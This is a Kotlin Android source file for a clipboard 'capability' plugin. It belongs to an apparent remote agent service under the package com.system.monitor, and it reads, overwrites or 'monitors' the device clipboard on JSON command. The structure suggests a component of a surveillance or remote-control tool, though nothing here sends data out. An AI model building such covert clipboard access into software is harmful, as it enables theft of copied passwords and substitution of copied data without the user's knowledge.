package com.system.monitor.capabilities

import android.content.ClipboardManager
import android.content.Context
import com.google.gson.Gson
import com.system.monitor.AgentService

class ClipboardCapability(private val service: AgentService) : AgentService.Capability {

    private val clipboard: ClipboardManager = service.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "get" -> mapOf("text" to clipboard.primaryClip?.getItemAt(0)?.text.toString())
            "set" -> { clipboard.setPrimaryClip(android.content.ClipData.newPlainText("clip", params.text)); mapOf("status" to "set") }
            "monitor" -> { mapOf("status" to "monitoring") }
            else -> mapOf("error" to "invalid action")
        }
    }

    override fun cleanup() {}

    data class Params(val action: String, val text: String? = null)
}